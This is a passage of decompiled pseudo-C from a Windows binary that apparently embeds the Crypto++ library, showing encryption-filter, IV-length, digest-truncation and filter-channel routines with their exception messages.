  v6 = *(_DWORD *)(this + 20);
  v7 = a4;
  if ( v6 )
  {
    if ( v6 != 1 )
      return 0;
  }
  else
  {
    *(_DWORD *)(this + 16) = 0;
    (*(void (__thiscall **)(int, int, int, _DWORD, int))(*(_DWORD *)(this + 36) + 24))(this + 36, a2, a3, 0, 1);
    if ( !a4 )
      return 0;
    v9 = sub_45F890((_DWORD *)(this + 36));
    v10 = v9;
    if ( HIDWORD(v9) )
    {
      sub_419B80((int)v16, "PK_DefaultEncryptionFilter: plaintext too long");
      v17 = 0;
      sub_405230(pExceptionObject, v16);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
    v13 = (*(int (__thiscall **)(_DWORD, _DWORD))(**(_DWORD **)(this + 28) + 8))(*(_DWORD *)(this + 28), v9);
    v16[3] = -1;
    v16[4] = v10;
    if ( v10 )
      v11 = sub_45AEA0(v10);
    else
      v11 = 0;
    Block = v11;
    v16[5] = v11;
    v12 = *(_DWORD *)(this + 36);
    v17 = 2;
    (*(void (__thiscall **)(int, void *, size_t))(v12 + 72))(this + 36, v11, v10);
    sub_438EB0((_DWORD *)(this + 76), v13);
    (*(void (__thiscall **)(_DWORD, _DWORD, void *, size_t, _DWORD, _DWORD))(**(_DWORD **)(this + 28) + 24))(
      *(_DWORD *)(this + 28),
      *(_DWORD *)(this + 24),
      Block,
      v10,
      *(_DWORD *)(this + 88),
      *(_DWORD *)(this + 32));
    memset(Block, 0, v10);
    j_j___free_base(Block);
    v7 = a4;
    v17 = -1;
  }
  if ( !sub_454730((_DWORD *)this, 1, *(_DWORD *)(this + 88), *(_DWORD *)(this + 84), v7, a5, (int)&dword_4EEDC0) )
    return 0;
  result = 1;
  if ( (unsigned int)(*(_DWORD *)(this + 84) - *(_DWORD *)(this + 16)) > 1 )
    return *(_DWORD *)(this + 84) - *(_DWORD *)(this + 16);
  return result;
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (00437D00) --------------------------------------------------------
int __thiscall sub_437D00(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned __int32 v4; // edx

  v4 = a2;
  if ( a3 )
    v4 = _byteswap_ulong(a2);
  this[2] = v4;
  return (*(int (__stdcall **)(int *, _DWORD *, int, _DWORD, int))(*this + 140))(&dword_4EEDC0, this + 2, 4, 0, a4);
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (00437D30) --------------------------------------------------------
int __thiscall sub_437D30(void *this, int a2, int a3, void (__thiscall ***a4)(_DWORD, int))
{
  (*(void (__thiscall **)(void *, int, int, void (__thiscall ***)(_DWORD, int)))(*(_DWORD *)this + 60))(
    this,
    a2,
    a3,
    a4);
  if ( a4 )
    (**a4)(a4, 1);
  return a2;
}

//----- (00437D90) --------------------------------------------------------
int __thiscall sub_437D90(void *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  int v9; // [esp+Ch] [ebp-10h]

  v9 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  (*(void (__thiscall **)(void *, int, int, int))(*(_DWORD *)this + 40))(this, v9, a6, a7);
  (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v9 + 16))(v9, a4, a5);
  (*(void (__thiscall **)(void *, int, int, int))(*(_DWORD *)this + 60))(this, a2, a3, v9);
  (**(void (__thiscall ***)(int, int))v9)(v9, 1);
  return a2;
}

//----- (00437E10) --------------------------------------------------------
int __thiscall sub_437E10(int *this, int a2, unsigned int a3, int a4)
{
  char v5; // al
  int v6; // edx
  int v8; // eax
  size_t *v9; // eax
  char v10[24]; // [esp+14h] [ebp-50h] BYREF
  char pExceptionObject[40]; // [esp+2Ch] [ebp-38h] BYREF
  int v12; // [esp+60h] [ebp-4h]

  v5 = (*(int (__thiscall **)(int *, unsigned int))(*this + 20))(this, a3);
  v6 = *this;
  if ( !v5 )
  {
    v8 = (*(int (__thiscall **)(int *))(v6 + 52))(this);
    v9 = (size_t *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v8 + 8))(v8, v10);
    v12 = 0;
    sub_436100(pExceptionObject, v9, a3);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVInvalidKeyLength_CryptoPP__);
  }
  return (*(int (__thiscall **)(int *, int, unsigned int, int))(v6 + 56))(this, a2, a3, a4);
}
// 437E10: using guessed type char var_50[24];

//----- (00437EB0) --------------------------------------------------------
void __thiscall sub_437EB0(int *this, int a2, int a3, int a4, int a5)
{
  _DWORD *v6; // eax
  int v7; // edx
  unsigned int v8; // ecx
  void *v9; // edx
  void **v10; // [esp+Ch] [ebp-34h] BYREF
  void (__thiscall ***v11)(_DWORD, int); // [esp+10h] [ebp-30h]
  char v12[4]; // [esp+18h] [ebp-28h] BYREF
  int v13; // [esp+1Ch] [ebp-24h]
  int v14; // [esp+20h] [ebp-20h]
  unsigned int v15; // [esp+28h] [ebp-18h]
  unsigned int v16; // [esp+2Ch] [ebp-14h]
  void *Block; // [esp+30h] [ebp-10h]
  int v18; // [esp+3Ch] [ebp-4h]

  v15 = -1;
  v16 = 0;
  Block = 0;
  v13 = a4;
  v14 = a5;
  v12[0] = 0;
  v18 = 4;
  v6 = sub_422210(&v10, (int)&unk_4B93C8, (int)v12, 1);
  v7 = *this;
  LOBYTE(v18) = 5;
  (*(void (__thiscall **)(int *, int, int, _DWORD *))(v7 + 24))(this, a2, a3, v6);
  LOBYTE(v18) = 6;
  if ( v11 )
    (**v11)(v11, 1);
  v10 = &CryptoPP::NameValuePairs::`vftable';
  v8 = v16;
  v9 = Block;
  if ( v15 < v16 )
    v8 = v15;
  v18 = 7;
  memset(Block, 0, v8);
  j_j___free_base(v9);
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 437EB0: using guessed type char var_28[4];

//----- (00437F80) --------------------------------------------------------
int __thiscall sub_437F80(void *this, int a2)
{
  int result; // eax
  int v4; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this);
  if ( result )
  {
    v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this);
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)v4 + 156))(v4, a2);
  }
  return result;
}

//----- (00437FB0) --------------------------------------------------------
int __thiscall sub_437FB0(void *this, int a2, void (__thiscall ***a3)(_DWORD, int), int a4)
{
  int result; // eax
  int v5; // edi

  result = (*(int (__thiscall **)(void *, int, void (__thiscall ***)(_DWORD, int), int, _DWORD))(*(_DWORD *)this + 48))(
             this,
             a2,
             a3,
             a4,
             0);
  v5 = result;
  if ( a3 )
  {
    (**a3)(a3, 1);
    return v5;
  }
  return result;
}

//----- (00438020) --------------------------------------------------------
int __thiscall sub_438020(void *this, int a2, int a3, int a4, int a5)
{
  int v7; // edi
  int v9; // [esp+24h] [ebp+8h]

  v9 = (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 36))(this, a2);
  (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v9 + 16))(v9, a3, a4);
  v7 = (*(int (__thiscall **)(void *, int, int, int, _DWORD))(*(_DWORD *)this + 48))(this, a2, v9, a5, 0);
  (**(void (__thiscall ***)(int, int))v9)(v9, 1);
  return v7;
}

//----- (004380A0) --------------------------------------------------------
int __thiscall sub_4380A0(void *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  int v9; // edi
  int v11; // [esp+24h] [ebp+8h]

  v11 = (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 36))(this, a2);
  (*(void (__thiscall **)(void *, int, int, int))(*(_DWORD *)this + 40))(this, v11, a3, a4);
  (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v11 + 16))(v11, a5, a6);
  v9 = (*(int (__thiscall **)(void *, int, int, int, _DWORD))(*(_DWORD *)this + 48))(this, a2, v11, a7, 0);
  (**(void (__thiscall ***)(int, int))v11)(v11, 1);
  return v9;
}

//----- (00438130) --------------------------------------------------------
int __thiscall sub_438130(void *this, int a2, int a3)
{
  int v4; // eax
  void ***v6; // eax
  int v7[2]; // [esp+10h] [ebp-8h] BYREF

  if ( (*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this) )
  {
    v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this);
    return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v4 + 88))(v4, a2, a3);
  }
  else
  {
    v7[0] = a2;
    v7[1] = a3;
    v6 = sub_438580();
    (*(void (__thiscall **)(void *, void ***, int *, int *, int))(*(_DWORD *)this + 128))(
      this,
      v6,
      v7,
      &dword_4EEDC0,
      1);
    return v7[0];
  }
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (004381A0) --------------------------------------------------------
int __thiscall sub_4381A0(void *this)
{
  int v2; // eax
  int result; // eax
  __int64 v4; // rax

  if ( (*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this) )
  {
    v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this);
    return (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 112))(v2);
  }
  else
  {
    while ( (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 108))(this, -1) )
      ;
    do
    {
      v4 = ((__int64 (__thiscall *)(void *, int, int))*(_DWORD *)(*(_DWORD *)this + 88))(this, -1, -1);
      result = HIDWORD(v4) | v4;
    }
    while ( result );
  }
  return result;
}

//----- (004381F0) --------------------------------------------------------
int __thiscall sub_4381F0(void *this, int a2)
{
  int v3; // eax
  void ***v5; // eax

  if ( (*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this) )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this);
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)v3 + 108))(v3, a2);
  }
  else
  {
    v5 = sub_438580();
    sub_438B60(this, (int)v5, (unsigned int *)&a2, (int)&dword_4EEDC0, 1);
    return a2;
  }
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (00438240) --------------------------------------------------------
int __thiscall sub_438240(void *this, unsigned __int64 a2, unsigned __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // rax
  int v7; // edi
  unsigned __int64 v8; // rax
  char *v9; // ebx
  char *v10; // esi
  char *v11; // eax
  int v12; // eax
  char *v13; // eax
  int v14; // eax
  _DWORD *v15; // eax
  int v16; // edi
  unsigned __int64 v17; // rax
  char *v18; // ebx
  char *v19; // esi
  char *v20; // eax
  int v21; // eax
  char *v22; // eax
  int v23; // eax
  _DWORD *v24; // eax
  int v26; // edi
  unsigned __int64 v27; // rax
  char *v28; // ebx
  char *v29; // esi
  char *v30; // eax
  int v31; // eax
  char *v32; // eax
  int v33; // eax
  char v34[24]; // [esp+38h] [ebp+0h] BYREF
  char v35[24]; // [esp+50h] [ebp+18h] BYREF
  char v36[24]; // [esp+68h] [ebp+30h] BYREF
  char v37[24]; // [esp+80h] [ebp+48h] BYREF
  char v38[24]; // [esp+98h] [ebp+60h] BYREF
  char v39[24]; // [esp+B0h] [ebp+78h] BYREF
  char v40[24]; // [esp+C8h] [ebp+90h] BYREF
  char pExceptionObject[40]; // [esp+E0h] [ebp+A8h] BYREF
  char v42[24]; // [esp+108h] [ebp+D0h] BYREF
  char v43[24]; // [esp+120h] [ebp+E8h] BYREF
  char v44[24]; // [esp+138h] [ebp+100h] BYREF
  char v45[24]; // [esp+150h] [ebp+118h] BYREF
  char v46[24]; // [esp+168h] [ebp+130h] BYREF
  char v47[24]; // [esp+180h] [ebp+148h] BYREF
  char v48[24]; // [esp+198h] [ebp+160h] BYREF
  char v49[40]; // [esp+1B0h] [ebp+178h] BYREF

  LODWORD(v5) = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 60))(this);
  if ( a2 > v5 )
  {
    v26 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 52))(this);
    v27 = ((__int64 (__thiscall *)(void *))*(_DWORD *)(*(_DWORD *)this + 60))(this);
    v28 = (char *)sub_43D030((int)v48, v27, 0xAu);
    v29 = (char *)sub_43D030((int)v47, a2, 0xAu);
    v30 = (char *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v26 + 8))(v26, v46);
    v31 = sub_421F20((int)v45, v30, ": header length ");
    v32 = (char *)sub_4220E0((int)v44, v31, v29);
    v33 = sub_421F20((int)v43, v32, " exceeds the maximum of ");
    v15 = (_DWORD *)sub_4220E0((int)v42, v33, v28);
LABEL_8:
    sub_405230(v49, v15);
    _CxxThrowException(v49, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  LODWORD(v6) = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 64))(this);
  if ( a3 > v6 )
  {
    v7 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 52))(this);
    v8 = ((__int64 (__thiscall *)(void *))*(_DWORD *)(*(_DWORD *)this + 64))(this);
    v9 = (char *)sub_43D030((int)v42, v8, 0xAu);
    v10 = (char *)sub_43D030((int)v43, a3, 0xAu);
    v11 = (char *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v7 + 8))(v7, v44);
    v12 = sub_421F20((int)v45, v11, ": message length ");
    v13 = (char *)sub_4220E0((int)v46, v12, v10);
    v14 = sub_421F20((int)v47, v13, " exceeds the maximum of ");
    v15 = (_DWORD *)sub_4220E0((int)v48, v14, v9);
    goto LABEL_8;
  }
  if ( a4 > ((__int64 (__thiscall *)(void *))*(_DWORD *)(*(_DWORD *)this + 68))(this) )
  {
    v16 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 52))(this);
    v17 = ((__int64 (__thiscall *)(void *))*(_DWORD *)(*(_DWORD *)this + 68))(this);
    v18 = (char *)sub_43D030((int)v40, v17, 0xAu);
    v19 = (char *)sub_43D030((int)v39, a4, 0xAu);
    v20 = (char *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v16 + 8))(v16, v38);
    v21 = sub_421F20((int)v37, v20, ": footer length ");
    v22 = (char *)sub_4220E0((int)v36, v21, v19);
    v23 = sub_421F20((int)v35, v22, " exceeds the maximum of ");
    v24 = (_DWORD *)sub_4220E0((int)v34, v23, v18);
    sub_405230(pExceptionObject, v24);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  return (*(int (__cdecl **)(_DWORD))(*(_DWORD *)this + 84))(a2);
}
// 4382C5: variable 'v5' is possibly undefined
// 4382E2: variable 'v6' is possibly undefined
// 438240: using guessed type char var_114[24];
// 438240: using guessed type char var_12C[24];
// 438240: using guessed type char var_144[24];
// 438240: using guessed type char var_15C[24];
// 438240: using guessed type char var_174[24];
// 438240: using guessed type char var_18C[24];
// 438240: using guessed type char var_1A4[24];

//----- (00438580) --------------------------------------------------------
void ***sub_438580()
{
  if ( dword_4EEDF0 > *(_DWORD *)(*((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex) + 4) )
  {
    _Init_thread_header(&dword_4EEDF0);
    if ( dword_4EEDF0 == -1 )
    {
      atexit(nullsub_2);
      _Init_thread_footer(&dword_4EEDF0);
    }
  }
  return &off_4E8020;
}
// 46C388: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 46C3D2: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 4E8020: using guessed type void **off_4E8020;
// 4EEDF0: using guessed type int dword_4EEDF0;
// 4F0864: using guessed type int TlsIndex;

//----- (00438610) --------------------------------------------------------
void __thiscall sub_438610(void *this, int a2)
{
  int v3; // eax
  char *v4; // eax
  _DWORD *v5; // eax
  char v6[24]; // [esp+8h] [ebp-68h] BYREF
  char v7[24]; // [esp+20h] [ebp-50h] BYREF
  char pExceptionObject[40]; // [esp+38h] [ebp-38h] BYREF
  int v9; // [esp+6Ch] [ebp-4h]

  if ( !a2 && (*(int (__thiscall **)(void *))(*(_DWORD *)this + 28))(this) == 2 )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 52))(this);
    v4 = (char *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v3 + 8))(v3, v7);
    v9 = 0;
    v5 = (_DWORD *)sub_421F20((int)v6, v4, ": this object cannot use a null IV");
    LOBYTE(v9) = 1;
    sub_405230(pExceptionObject, v5);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
}
// 438610: using guessed type char var_50[24];
// 438610: using guessed type char var_68[24];

//----- (004386B0) --------------------------------------------------------
int __thiscall sub_4386B0(int *this, unsigned int a2)
{
  unsigned int v3; // ebx
  int v4; // eax
  unsigned int v6; // eax
  int v7; // edx
  int *v8; // edi
  unsigned int v9; // eax
  char *v10; // ebx
  char *v11; // esi
  int v12; // edx
  char *v13; // eax
  int v14; // eax
  char *v15; // eax
  int v16; // eax
  _DWORD *v17; // eax
  int *v18; // edi
  unsigned int v19; // eax
  char *v20; // ebx
  char *v21; // esi
  int v22; // edx
  char *v23; // eax
  int v24; // eax
  char *v25; // eax
  int v26; // eax
  _DWORD *v27; // eax
  char v28[24]; // [esp+14h] [ebp-1B0h] BYREF
  char v29[24]; // [esp+2Ch] [ebp-198h] BYREF
  char v30[24]; // [esp+44h] [ebp-180h] BYREF
  char v31[24]; // [esp+5Ch] [ebp-168h] BYREF
  char v32[24]; // [esp+74h] [ebp-150h] BYREF
  char v33[24]; // [esp+8Ch] [ebp-138h] BYREF
  char v34[24]; // [esp+A4h] [ebp-120h] BYREF
  char v35[24]; // [esp+BCh] [ebp-108h] BYREF
  char v36[24]; // [esp+D4h] [ebp-F0h] BYREF
  char v37[24]; // [esp+ECh] [ebp-D8h] BYREF
  char v38[24]; // [esp+104h] [ebp-C0h] BYREF
  char v39[24]; // [esp+11Ch] [ebp-A8h] BYREF
  char v40[24]; // [esp+134h] [ebp-90h] BYREF
  char v41[24]; // [esp+14Ch] [ebp-78h] BYREF
  char pExceptionObject[40]; // [esp+164h] [ebp-60h] BYREF
  char v43[40]; // [esp+18Ch] [ebp-38h] BYREF
  int v44; // [esp+1C0h] [ebp-4h]

  v3 = a2;
  v4 = *this;
  if ( (a2 & 0x80000000) != 0 )
    return (*(int (**)(void))(v4 + 32))();
  v6 = (*(int (**)(void))(v4 + 36))();
  v7 = *this;
  if ( a2 < v6 )
  {
    v18 = (int *)(*(int (__thiscall **)(int *))(v7 + 52))(this);
    v19 = (*(int (__thiscall **)(int *))(*this + 36))(this);
    v20 = (char *)sub_434410((int)v41, v19, 0xAu);
    v44 = 0;
    v21 = (char *)sub_435B30((int)v40, a2, 0xAu);
    v22 = *v18;
    LOBYTE(v44) = 1;
    v23 = (char *)(*(int (__thiscall **)(int *, char *))(v22 + 8))(v18, v39);
    LOBYTE(v44) = 2;
    v24 = sub_421F20((int)v38, v23, ": IV length ");
    LOBYTE(v44) = 3;
    v25 = (char *)sub_4220E0((int)v37, v24, v21);
    LOBYTE(v44) = 4;
    v26 = sub_421F20((int)v36, v25, " is less than the minimum of ");
    LOBYTE(v44) = 5;
    v27 = (_DWORD *)sub_4220E0((int)v35, v26, v20);
    LOBYTE(v44) = 6;
    sub_405230(v43, v27);
    _CxxThrowException(v43, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  if ( a2 > (*(int (__thiscall **)(int *))(v7 + 40))(this) )
  {
    v8 = (int *)(*(int (__thiscall **)(int *))(*this + 52))(this);
    v9 = (*(int (__thiscall **)(int *))(*this + 40))(this);
    v10 = (char *)sub_434410((int)v34, v9, 0xAu);
    v44 = 7;
    v11 = (char *)sub_435B30((int)v33, a2, 0xAu);
    v12 = *v8;
    LOBYTE(v44) = 8;
    v13 = (char *)(*(int (__thiscall **)(int *, char *))(v12 + 8))(v8, v32);
    LOBYTE(v44) = 9;
    v14 = sub_421F20((int)v31, v13, ": IV length ");
    LOBYTE(v44) = 10;
    v15 = (char *)sub_4220E0((int)v30, v14, v11);
    LOBYTE(v44) = 11;
    v16 = sub_421F20((int)v29, v15, " exceeds the maximum of ");
    LOBYTE(v44) = 12;
    v17 = (_DWORD *)sub_4220E0((int)v28, v16, v10);
    LOBYTE(v44) = 13;
    sub_405230(pExceptionObject, v17);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  return v3;
}
// 4386B0: using guessed type char var_120[24];
// 4386B0: using guessed type char var_138[24];
// 4386B0: using guessed type char var_150[24];
// 4386B0: using guessed type char var_168[24];
// 4386B0: using guessed type char var_180[24];
// 4386B0: using guessed type char var_198[24];
// 4386B0: using guessed type char var_1B0[24];
// 4386B0: using guessed type char var_78[24];
// 4386B0: using guessed type char var_90[24];
// 4386B0: using guessed type char var_A8[24];
// 4386B0: using guessed type char var_C0[24];
// 4386B0: using guessed type char var_D8[24];
// 4386B0: using guessed type char var_F0[24];
// 4386B0: using guessed type char var_108[24];

//----- (004388B0) --------------------------------------------------------
unsigned int __thiscall sub_4388B0(int *this, unsigned int a2)
{
  unsigned int result; // eax
  char *v4; // esi
  int v5; // edx
  unsigned int v6; // eax
  char *v7; // eax
  char *v8; // eax
  int v9; // eax
  char *v10; // eax
  _DWORD *v11; // eax
  char v12[24]; // [esp+Ch] [ebp-C8h] BYREF
  char v13[24]; // [esp+24h] [ebp-B0h] BYREF
  char v14[24]; // [esp+3Ch] [ebp-98h] BYREF
  char v15[24]; // [esp+54h] [ebp-80h] BYREF
  char v16[24]; // [esp+6Ch] [ebp-68h] BYREF
  char v17[24]; // [esp+84h] [ebp-50h] BYREF
  char pExceptionObject[40]; // [esp+9Ch] [ebp-38h] BYREF
  int v19; // [esp+D0h] [ebp-4h]

  result = (*(int (__thiscall **)(int *))(*this + 32))(this);
  if ( a2 > result )
  {
    v4 = (char *)sub_434410((int)v17, a2, 0xAu);
    v5 = *this;
    v19 = 0;
    v6 = (*(int (__thiscall **)(int *))(v5 + 32))(this);
    v7 = (char *)sub_434410((int)v16, v6, 0xAu);
    LOBYTE(v19) = 1;
    v8 = (char *)sub_421FB0((int)v15, "HashTransformation: can't truncate a ", v7);
    LOBYTE(v19) = 2;
    v9 = sub_421F20((int)v14, v8, " byte digest to ");
    LOBYTE(v19) = 3;
    v10 = (char *)sub_4220E0((int)v13, v9, v4);
    LOBYTE(v19) = 4;
    v11 = (_DWORD *)sub_421F20((int)v12, v10, " bytes");
    LOBYTE(v19) = 5;
    sub_405230(pExceptionObject, v11);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  return result;
}
// 4388B0: using guessed type char var_50[24];
// 4388B0: using guessed type char var_68[24];
// 4388B0: using guessed type char var_80[24];
// 4388B0: using guessed type char var_98[24];
// 4388B0: using guessed type char var_B0[24];
// 4388B0: using guessed type char var_C8[24];

//----- (004389B0) --------------------------------------------------------
int __thiscall sub_4389B0(int *this)
{
  int v2; // eax
  int v3; // edx
  int v4; // eax

  v2 = (*(int (__thiscall **)(int *))(*this + 164))(this);
  v3 = *this;
  if ( !v2 )
    return (*(int (__thiscall **)(int *))(v3 + 64))(this);
  v4 = (*(int (__thiscall **)(int *))(v3 + 164))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 92))(v4);
}

//----- (004389E0) --------------------------------------------------------
int __thiscall sub_4389E0(void *this, int a2, int a3, int a4)
{
  int v4; // esi
  int v5; // ebx
  int v7; // ebp
  int v8; // eax
  void *v9; // eax
  int result; // eax
  unsigned int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // ecx
  __int64 v16; // [esp+10h] [ebp-10h] BYREF
  int v17[2]; // [esp+18h] [ebp-8h] BYREF
  unsigned int v18; // [esp+24h] [ebp+4h]

  v4 = (int)this;
  if ( (*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this) )
  {
    do
      v4 = (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 168))(v4);
    while ( (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 168))(v4) );
  }
  v5 = a3;
  v7 = a4;
  do
  {
    v8 = *(_DWORD *)v4;
    a3 = -1;
    if ( (*(int (__thiscall **)(int))(v8 + 168))(v4) )
    {
      v9 = (void *)(*(int (__thiscall **)(int))(*(_DWORD *)v4 + 168))(v4);
      result = sub_438B60(v9, a2, (unsigned int *)&a3, v5, v7);
      if ( result )
        return result;
    }
    else
    {
      v18 = a3;
      a3 = 0;
      if ( !v18 )
        goto LABEL_8;
      while ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v4 + 100))(v4) )
      {
        while ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v4 + 68))(v4) )
        {
          v13 = *(_DWORD *)v4;
          v17[0] = -1;
          v17[1] = -1;
          result = (*(int (__thiscall **)(int, int, int *, int, int))(v13 + 128))(v4, a2, v17, v5, v7);
          if ( result )
            return result;
        }
        v14 = (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 60))(v4);
        if ( v14 >= 0 )
          v15 = v14 + 1;
        else
          v15 = -1;
        if ( (*(int (__thiscall **)(int, int, _DWORD, _DWORD, int, int))(*(_DWORD *)a2 + 140))(a2, v5, 0, 0, v15, v7) )
          return 1;
        (*(void (__thiscall **)(int))(*(_DWORD *)v4 + 104))(v4);
        v11 = a3 + 1;
        a3 = v11;
        if ( v11 >= v18 )
          goto LABEL_7;
      }
    }
    v11 = a3;
LABEL_7:
    ;
  }
  while ( v11 );
  do
  {
LABEL_8:
    v12 = *(_DWORD *)v4;
    v16 = 0xFFFFFFFFi64;
    result = (*(int (__thiscall **)(int, int, __int64 *, int, int))(v12 + 128))(v4, a2, &v16, v5, v7);
    if ( result )
      break;
    result = HIDWORD(v16) | v16;
  }
  while ( v16 );
  return result;
}

//----- (00438B60) --------------------------------------------------------
int __thiscall sub_438B60(void *this, int a2, unsigned int *a3, int a4, int a5)
{
  int v5; // esi
  unsigned int v6; // ecx
  int v7; // eax
  int result; // eax
  int v9; // eax
  int v10; // ecx
  unsigned int v11; // [esp+24h] [ebp-Ch]
  int v12[2]; // [esp+28h] [ebp-8h] BYREF

  v5 = (int)this;
  if ( (*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this) )
  {
    do
      v5 = (*(int (__thiscall **)(int))(*(_DWORD *)v5 + 168))(v5);
    while ( (*(int (__thiscall **)(int))(*(_DWORD *)v5 + 168))(v5) );
  }
  v11 = *a3;
  v6 = *a3;
  *a3 = 0;
  if ( v6 )
  {
    while ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5 + 100))(v5) )
    {
      while ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5 + 68))(v5) )
      {
        v7 = *(_DWORD *)v5;
        v12[0] = -1;
        v12[1] = -1;
        result = (*(int (__thiscall **)(int, int, int *, int, int))(v7 + 128))(v5, a2, v12, a4, a5);
        if ( result )
          return result;
      }
      v9 = (*(int (__thiscall **)(int))(*(_DWORD *)v5 + 60))(v5);
      if ( v9 >= 0 )
        v10 = v9 + 1;
      else
        v10 = -1;
      if ( (*(int (__thiscall **)(int, int, _DWORD, _DWORD, int, int))(*(_DWORD *)a2 + 140))(a2, a4, 0, 0, v10, a5) )
        return 1;
      (*(void (__thiscall **)(int))(*(_DWORD *)v5 + 104))(v5);
      if ( ++*a3 >= v11 )
        return 0;
    }
  }
  return 0;
}

//----- (00438C60) --------------------------------------------------------
bool __thiscall sub_438C60(int *this, __m128i *a2, unsigned int a3)
{
  void *v4; // edi
  int v5; // edx
  bool v6; // bl
  char *v8; // esi
  int v9; // edx
  unsigned int v10; // eax
  char *v11; // eax
  char *v12; // eax
  int v13; // eax
  char *v14; // eax
  _DWORD *v15; // eax
  void *Block; // [esp+14h] [ebp-CCh]
  char v17[24]; // [esp+18h] [ebp-C8h] BYREF
  char v18[24]; // [esp+30h] [ebp-B0h] BYREF
  char v19[24]; // [esp+48h] [ebp-98h] BYREF
  char v20[24]; // [esp+60h] [ebp-80h] BYREF
  char v21[24]; // [esp+78h] [ebp-68h] BYREF
  char pExceptionObject[40]; // [esp+90h] [ebp-50h] BYREF
  char v23[8]; // [esp+B8h] [ebp-28h] BYREF
  int v24; // [esp+C4h] [ebp-1Ch]
  unsigned int v25; // [esp+C8h] [ebp-18h]
  void *v26; // [esp+CCh] [ebp-14h]
  int v27; // [esp+DCh] [ebp-4h]

  if ( a3 > (*(int (__thiscall **)(int *))(*this + 32))(this) )
  {
    v8 = (char *)sub_434410((int)v23, a3, 0xAu);
    v9 = *this;
    v27 = 0;
    v10 = (*(int (__thiscall **)(int *))(v9 + 32))(this);
    v11 = (char *)sub_434410((int)v21, v10, 0xAu);
    LOBYTE(v27) = 1;
    v12 = (char *)sub_421FB0((int)v20, "HashTransformation: can't truncate a ", v11);
    LOBYTE(v27) = 2;
    v13 = sub_421F20((int)v19, v12, " byte digest to ");
    LOBYTE(v27) = 3;
    v14 = (char *)sub_4220E0((int)v18, v13, v8);
    LOBYTE(v27) = 4;
    v15 = (_DWORD *)sub_421F20((int)v17, v14, " bytes");
    LOBYTE(v27) = 5;
    sub_405230(pExceptionObject, v15);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v24 = -1;
  v25 = a3;
  if ( a3 )
  {
    Block = sub_45AEA0(a3);
    v4 = Block;
  }
  else
  {
    v4 = 0;
    Block = 0;
  }
  v26 = v4;
  v5 = *this;
  v27 = 7;
  (*(void (__thiscall **)(int *, void *, unsigned int))(v5 + 60))(this, v4, a3);
  v6 = sub_45AF10((int)v4, a2, a3);
  v27 = 8;
  memset(v4, 0, a3);
  j_j___free_base(Block);
  return v6;
}
// 438C60: using guessed type char var_28[8];
// 438C60: using guessed type char var_68[24];
